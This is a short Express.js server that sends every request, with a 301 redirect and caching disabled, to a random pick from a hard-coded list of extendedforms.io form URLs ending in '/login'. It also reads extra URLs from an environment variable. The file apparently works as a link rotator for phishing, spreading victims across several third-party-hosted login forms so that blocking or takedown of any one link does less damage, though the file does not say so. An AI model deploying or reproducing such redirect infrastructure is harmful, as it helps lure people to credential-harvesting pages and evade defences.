const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const additionalUrls = process.env.ADD_URL;

const listUrls = [
  'https://extendedforms.io/form/94f5d659-82e9-4320-b8c5-9380aa4c2aec/login',
  'https://extendedforms.io/form/94f533f9-be95-4838-a6f9-5b8adb4f6cb2/login',
  'https://extendedforms.io/form/94f5d4d9-f645-4266-bdcc-400593cb1a05/login',
  'https://extendedforms.io/form/94f5d483-24b7-4fa1-813e-6718a9638840/login',
  'https://extendedforms.io/form/94f5d416-b77c-4c11-b07b-1a7a2889746a/login',
  'https://extendedforms.io/form/94f5d348-7a0f-4836-8afe-ef856791f659/login',
  'https://extendedforms.io/form/94f5d2e6-021d-427d-a2bd-2c9eb254ce7a/login',
  'https://extendedforms.io/form/94f5b5fc-dde6-434b-b801-7610db04825d/login',
  'https://extendedforms.io/form/94f51c1c-91ac-46ed-918b-917f17838170/login',
];

if (additionalUrls) {
  listUrls.push(...additionalUrls.split(','));
}
console.log('LIST URLS: ');
console.log(listUrls);

function randomUrl() {
    const max = listUrls.length;
    const randomIndex =  Math.floor(Math.random() * max);
    return listUrls[randomIndex];
}

app.get('/*', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.redirect(301, randomUrl());
})

app.listen(port, () => {
  console.log(`App listening on port ${port}`);
})

module.exports = app;